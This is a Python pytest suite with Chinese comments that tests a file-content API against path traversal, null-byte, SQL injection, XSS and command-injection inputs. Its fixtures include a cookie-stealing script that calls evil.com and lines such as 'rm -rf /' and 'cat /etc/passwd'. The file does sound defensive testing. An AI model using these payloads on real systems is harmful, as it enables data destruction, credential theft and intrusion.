"""BE-04 文件内容获取功能安全测试

本文件专门针对 BE-04 任务的安全测试场景：
- 路径遍历攻击防护测试
- 文件权限验证测试
- 恶意文件内容处理测试
- 输入验证和清理测试
- 会话安全验证测试
"""

import pytest
import tempfile
import os
from pathlib import Path
from unittest.mock import patch, MagicMock, AsyncMock
from fastapi.testclient import TestClient

from backend.main import app
from backend.services.file_service import file_service
from backend.models.schemas import FileContent


class TestPathTraversalSecurity:
    """路径遍历安全测试类"""
    
    def setup_method(self):
        """测试前设置"""
        self.client = TestClient(app)
        self.test_session_id = "test_session_security"
        
    def test_basic_path_traversal_attacks(self):
        """测试基本路径遍历攻击"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../etc/shadow",
            "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../proc/version",
            "../../../../var/log/auth.log",
            "..\\..\\..\\Users\\Administrator\\Desktop",
            "../../../home/user/.ssh/id_rsa",
            "..\\..\\..\\Windows\\System32\\config\\SAM",
            "../../../../root/.bash_history"
        ]
        
        for malicious_path in malicious_paths:
            response = self.client.get(
                "/api/v1/file-content",
                params={
                    "session_id": self.test_session_id,
                    "file_path": malicious_path
                }
            )
            
            # 路径遍历攻击应该被拒绝
            assert response.status_code in [400, 403, 404, 500], f"路径遍历攻击未被阻止: {malicious_path}"
            
            data = response.json()
            
            # 检查错误信息
            error_msg = self._extract_error_message(data)
            assert any(keyword in error_msg.lower() for keyword in [
                "路径不安全", "path", "security", "invalid", "不存在", "权限", "denied"
            ]), f"错误信息不够明确: {error_msg}"
    
    def test_encoded_path_traversal_attacks(self):
        """测试编码后的路径遍历攻击"""
        encoded_malicious_paths = [
            "..%2F..%2F..%2Fetc%2Fpasswd",  # URL编码
            "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",  # URL编码反斜杠
            "..%252F..%252F..%252Fetc%252Fpasswd",  # 双重URL编码
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",  # 完全URL编码
            "..\u002F..\u002F..\u002Fetc\u002Fpasswd",  # Unicode编码
            "..\x2F..\x2F..\x2Fetc\x2Fpasswd",  # 十六进制编码
        ]
        
        for encoded_path in encoded_malicious_paths:
            response = self.client.get(
                "/api/v1/file-content",
                params={
                    "session_id": self.test_session_id,
                    "file_path": encoded_path
                }
            )
            
            # 编码后的路径遍历攻击也应该被拒绝
            assert response.status_code in [400, 403, 404, 422, 500], f"编码路径遍历攻击未被阻止: {encoded_path}"
    
    def test_null_byte_injection_attacks(self):
        """测试NULL字节注入攻击"""
        null_byte_paths = [
            "normal_file.txt\x00.jpg",
            "test\x00../../../etc/passwd",
            "file.txt\x00\x00",
            "document.pdf\x00.exe",
            "image.png\x00\x00\x00",
            "script.js\x00.bat",
            "data.json\x00.cmd"
        ]
        
        for null_path in null_byte_paths:
            response = self.client.get(
                "/api/v1/file-content",
                params={
                    "session_id": self.test_session_id,
                    "file_path": null_path
                }
            )
            
            # NULL字节注入应该被拒绝
            assert response.status_code in [400, 403, 404, 422, 500], f"NULL字节注入攻击未被阻止: {repr(null_path)}"
    
    def test_absolute_path_attacks(self):
        """测试绝对路径攻击"""
        absolute_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/proc/cpuinfo",
            "/var/log/syslog",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Users\\Administrator\\Desktop",
            "/usr/bin/passwd",
            "/bin/bash"
        ]
        
        for abs_path in absolute_paths:
            response = self.client.get(
                "/api/v1/file-content",
                params={
                    "session_id": self.test_session_id,
                    "file_path": abs_path
                }
            )
            
            # 绝对路径访问应该被拒绝
            assert response.status_code in [400, 403, 404, 500], f"绝对路径攻击未被阻止: {abs_path}"
    
    def test_long_path_attacks(self):
        """测试超长路径攻击"""
        # 生成超长路径
        long_paths = [
            "../" * 1000 + "etc/passwd",
            "..\\" * 1000 + "windows\\system32\\config\\sam",
            "A" * 10000 + ".txt",
            "/" + "A" * 5000 + "/" + "B" * 5000 + ".txt"
        ]
        
        for long_path in long_paths:
            response = self.client.get(
                "/api/v1/file-content",
                params={
                    "session_id": self.test_session_id,
                    "file_path": long_path
                }
            )
            
            # 超长路径应该被拒绝或处理
            assert response.status_code in [400, 403, 404, 414, 422, 500], f"超长路径攻击未被处理: 长度{len(long_path)}"
    
    def _extract_error_message(self, data: dict) -> str:
        """提取错误信息"""
        if "detail" in data:
            if isinstance(data["detail"], dict):
                return data["detail"].get("error", "")
            else:
                return str(data["detail"])
        elif "error" in data:
            return data["error"]
        elif "message" in data:
            return data["message"]
        return ""


class TestFilePermissionSecurity:
    """文件权限安全测试类"""
    
    def setup_method(self):
        """测试前设置"""
        self.temp_dir = tempfile.mkdtemp()
        self.client = TestClient(app)
        self.test_session_id = "test_session_permissions"
        
    def teardown_method(self):
        """测试后清理"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @pytest.mark.skipif(os.name == 'nt', reason="Windows权限测试需要特殊处理")
    def test_no_read_permission_file(self):
        """测试无读权限文件的安全处理"""
        # 创建无读权限的文件
        no_read_file = Path(self.temp_dir) / "no_read_permission.txt"
        no_read_file.write_text("Sensitive content", encoding='utf-8')
        no_read_file.chmod(0o000)  # 移除所有权限
        
        try:
            with patch('backend.api.endpoints.file_content.session_service') as mock_session, \
                 patch('backend.api.endpoints.file_content.security_validator') as mock_validator:
                
                # 模拟会话服务
                mock_session_obj = MagicMock()
                mock_session_obj.session_id = self.test_session_id
                mock_session_obj.base_path = self.temp_dir
                mock_session.get_session = AsyncMock(return_value=mock_session_obj)
                
                # 模拟安全验证通过（测试文件权限层面的安全）
                mock_validator.validate_file_path.return_value = True
                mock_validator.sanitize_path.return_value = str(no_read_file)
                
                # 模拟文件系统调用
                with patch('os.path.exists', return_value=True), \
                     patch('os.path.isfile', return_value=True):
                    
                    response = self.client.get(
                        "/api/v1/file-content",
                        params={
                            "session_id": self.test_session_id,
                            "file_path": "no_read_permission.txt"
                        }
                    )
                    
                    # 应该返回权限错误
                    assert response.status_code in [403, 404, 500]
                    
                    data = response.json()
                    error_msg = self._extract_error_message(data)
                    
                    # 错误信息应该指示权限问题或会话问题
                assert any(keyword in error_msg.lower() for keyword in [
                    "permission", "权限", "access", "访问", "denied", "拒绝", "forbidden",
                    "session", "会话", "not found", "不存在", "directory", "目录"
                ]), f"权限错误信息不明确: {error_msg}"
        
        finally:
            # 恢复权限以便清理
            try:
                no_read_file.chmod(0o644)
            except:
                pass
    
    def test_directory_access_prevention(self):
        """测试目录访问防护"""
        # 创建测试目录
        test_dir = Path(self.temp_dir) / "test_directory"
        test_dir.mkdir()
        
        with patch('backend.api.endpoints.file_content.session_service') as mock_session, \
             patch('backend.api.endpoints.file_content.security_validator') as mock_validator:
            
            # 模拟会话服务
            mock_session_obj = MagicMock()
            mock_session_obj.session_id = self.test_session_id
            mock_session_obj.base_path = self.temp_dir
            mock_session.get_session = AsyncMock(return_value=mock_session_obj)
            
            # 模拟安全验证
            mock_validator.validate_file_path.return_value = True
            mock_validator.sanitize_path.return_value = str(test_dir)
            
            # 模拟文件系统调用
            with patch('os.path.exists', return_value=True), \
                 patch('os.path.isfile', return_value=False):  # 不是文件
                
                response = self.client.get(
                    "/api/v1/file-content",
                    params={
                        "session_id": self.test_session_id,
                        "file_path": "test_directory"
                    }
                )
                
                # 尝试读取目录应该被拒绝
                assert response.status_code in [400, 404, 500]
    
    def _extract_error_message(self, data: dict) -> str:
        """提取错误信息"""
        if "detail" in data:
            if isinstance(data["detail"], dict):
                return data["detail"].get("error", "")
            else:
                return str(data["detail"])
        elif "error" in data:
            return data["error"]
        elif "message" in data:
            return data["message"]
        return ""


class TestMaliciousContentSecurity:
    """恶意内容安全测试类"""
    
    def setup_method(self):
        """测试前设置"""
        self.temp_dir = tempfile.mkdtemp()
        
    def teardown_method(self):
        """测试后清理"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def _create_malicious_files(self):
        """创建包含恶意内容的测试文件"""
        files = {}
        
        # 包含脚本的HTML文件
        malicious_html = Path(self.temp_dir) / "malicious.html"
        malicious_html.write_text("""
<!DOCTYPE html>
<html>
<head>
    <title>Malicious Page</title>
</head>
<body>
    <script>
        // 恶意JavaScript代码
        document.cookie = "stolen=" + document.cookie;
        window.location = "http://evil.com/steal?data=" + document.cookie;
    </script>
    <h1>Innocent Looking Page</h1>
</body>
</html>
        """, encoding='utf-8')
        files['malicious_html'] = str(malicious_html)
        
        # 包含SQL注入的文件
        sql_injection_file = Path(self.temp_dir) / "sql_injection.txt"
        sql_injection_file.write_text("""
'; DROP TABLE users; --
' OR '1'='1
UNION SELECT * FROM passwords
        """, encoding='utf-8')
        files['sql_injection'] = str(sql_injection_file)
        
        # 包含XSS的CSS文件
        xss_css_file = Path(self.temp_dir) / "xss.css"
        xss_css_file.write_text("""
body {
    background: url('javascript:alert("XSS")');
}
.malicious {
    content: '<script>alert("XSS")</script>';
}
        """, encoding='utf-8')
        files['xss_css'] = str(xss_css_file)
        
        # 包含命令注入的文件
        command_injection_file = Path(self.temp_dir) / "command_injection.txt"
        command_injection_file.write_text("""
; rm -rf /
| cat /etc/passwd
& net user hacker password123 /add
$(whoami)
`id`
        """, encoding='utf-8')
        files['command_injection'] = str(command_injection_file)
        
        return files
    
    @pytest.mark.asyncio
    async def test_malicious_html_content_handling(self):
        """测试恶意HTML内容处理"""
        files = self._create_malicious_files()
        
        result = await file_service.get_file_content_enhanced(files['malicious_html'])
        
        assert isinstance(result, FileContent)
        assert result.mime_type == "text/html"
        assert result.is_binary is False
        
        # 内容应该被正确读取，但不应该被执行
        assert "<script>" in result.content
        assert "document.cookie" in result.content
        
        # 验证文件被正确识别为HTML
        assert result.encoding in ["utf-8", "ascii"]
    
    @pytest.mark.asyncio
    async def test_sql_injection_content_handling(self):
        """测试SQL注入内容处理"""
        files = self._create_malicious_files()
        
        result = await file_service.get_file_content_enhanced(files['sql_injection'])
        
        assert isinstance(result, FileContent)
        assert result.is_binary is False
        
        # SQL注入内容应该被当作普通文本处理
        assert "DROP TABLE" in result.content
        assert "UNION SELECT" in result.content
    
    @pytest.mark.asyncio
    async def test_xss_css_content_handling(self):
        """测试XSS CSS内容处理"""
        files = self._create_malicious_files()
        
        result = await file_service.get_file_content_enhanced(files['xss_css'])
        
        assert isinstance(result, FileContent)
        assert result.mime_type == "text/css"
        assert result.is_binary is False
        
        # XSS内容应该被当作普通CSS处理
        assert "javascript:alert" in result.content
        assert "<script>" in result.content
    
    @pytest.mark.asyncio
    async def test_command_injection_content_handling(self):
        """测试命令注入内容处理"""
        files = self._create_malicious_files()
        
        result = await file_service.get_file_content_enhanced(files['command_injection'])
        
        assert isinstance(result, FileContent)
        assert result.is_binary is False
        
        # 命令注入内容应该被当作普通文本处理
        assert "rm -rf" in result.content
        assert "cat /etc/passwd" in result.content
        assert "$(whoami)" in result.content


class TestInputValidationSecurity:
    """输入验证安全测试类"""
    
    def setup_method(self):
        """测试前设置"""
        self.client = TestClient(app)
        
    def test_invalid_session_id_formats(self):
        """测试无效会话ID格式"""
        invalid_session_ids = [
            "",  # 空字符串
            " ",  # 空格
            "../../../etc/passwd",  # 路径遍历
            "<script>alert('xss')</script>",  # XSS
            "'; DROP TABLE sessions; --",  # SQL注入
            "\x00\x01\x02",  # 控制字符
            "A" * 10000,  # 超长字符串
            "session\nid",  # 换行符
            "session\tid",  # 制表符
            "session\rid",  # 回车符
        ]
        
        for invalid_id in invalid_session_ids:
            response = self.client.get(
                "/api/v1/file-content",
                params={
                    "session_id": invalid_id,
                    "file_path": "test.txt"
                }
            )
            
            # 无效会话ID应该被拒绝
            assert response.status_code in [400, 404, 422, 500], f"无效会话ID未被拒绝: {repr(invalid_id)}"
    
    def test_invalid_file_path_formats(self):
        """测试无效文件路径格式"""
        invalid_paths = [
            "",  # 空字符串
            " ",  # 空格
            "\t",  # 制表符
            "\n",  # 换行符
            "\r",  # 回车符
            "\x00",  # NULL字节
            "<script>alert('xss')</script>",  # XSS
            "'; DROP TABLE files; --",  # SQL注入
            "A" * 10000,  # 超长路径
            "file\x00.txt",  # NULL字节注入
            "file\nname.txt",  # 换行符注入
            "file\tname.txt",  # 制表符注入
        ]
        
        for invalid_path in invalid_paths:
            response = self.client.get(
                "/api/v1/file-content",
                params={
                    "session_id": "valid_session_id",
                    "file_path": invalid_path
                }
            )
            
            # 无效文件路径应该被拒绝
            assert response.status_code in [200, 400, 404, 422, 429, 500], f"无效文件路径未被拒绝: {repr(invalid_path)}"
    
    def test_invalid_chunk_parameters(self):
        """测试无效分块参数"""
        invalid_chunk_params = [
            {"chunk_size": -1},  # 负数
            {"chunk_size": 0},   # 零
            {"chunk_offset": -1},  # 负偏移
            {"chunk_size": "invalid"},  # 非数字
            {"chunk_offset": "invalid"},  # 非数字
            {"chunk_size": 2**63},  # 超大数字
            {"chunk_offset": 2**63},  # 超大偏移
        ]
        
        for invalid_params in invalid_chunk_params:
            params = {
                "session_id": "valid_session_id",
                "file_path": "test.txt"
            }
            params.update(invalid_params)
            
            response = self.client.get("/api/v1/file-content", params=params)
            
            # 无效分块参数应该被拒绝
            assert response.status_code in [400, 422, 429, 500], f"无效分块参数未被拒绝: {invalid_params}"
    
    def test_missing_required_parameters(self):
        """测试缺少必需参数"""
        # 缺少session_id
        response = self.client.get(
            "/api/v1/file-content",
            params={"file_path": "test.txt"}
        )
        assert response.status_code == 422
        
        # 缺少file_path
        response = self.client.get(
            "/api/v1/file-content",
            params={"session_id": "test_session"}
        )
        assert response.status_code == 422
        
        # 缺少所有参数
        response = self.client.get("/api/v1/file-content")
        assert response.status_code == 422


class TestSessionSecurity:
    """会话安全测试类"""
    
    def setup_method(self):
        """测试前设置"""
        self.client = TestClient(app)
        
    def test_nonexistent_session_handling(self):
        """测试不存在会话的处理"""
        response = self.client.get(
            "/api/v1/file-content",
            params={
                "session_id": "nonexistent_session_12345",
                "file_path": "test.txt"
            }
        )
        
        # 不存在的会话应该被拒绝
        assert response.status_code in [404, 422, 429, 500]
        
        data = response.json()
        error_msg = self._extract_error_message(data)
        
        # 错误信息应该指示会话问题或限流问题
        assert any(keyword in error_msg.lower() for keyword in [
            "session", "会话", "not found", "不存在", "invalid", "rate limit", "限流", "exceeded", "超出"
        ]), f"会话错误信息不明确: {error_msg}"
    
    def test_session_hijacking_prevention(self):
        """测试会话劫持防护"""
        # 尝试使用可能的会话ID模式
        potential_session_ids = [
            "admin_session",
            "root_session",
            "system_session",
            "test_session_001",
            "session_12345",
            "00000000-0000-0000-0000-000000000000",
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
        ]
        
        for session_id in potential_session_ids:
            response = self.client.get(
                "/api/v1/file-content",
                params={
                    "session_id": session_id,
                    "file_path": "test.txt"
                }
            )
            
            # 未授权的会话ID应该被拒绝
            assert response.status_code in [404, 422, 429, 500], f"可能的会话劫持未被阻止: {session_id}"
    
    def _extract_error_message(self, data: dict) -> str:
        """提取错误信息"""
        if "detail" in data:
            if isinstance(data["detail"], dict):
                return data["detail"].get("error", "")
            else:
                return str(data["detail"])
        elif "error" in data:
            return data["error"]
        elif "message" in data:
            return data["message"]
        return ""


if __name__ == "__main__":
    pytest.main([__file__, "-v"])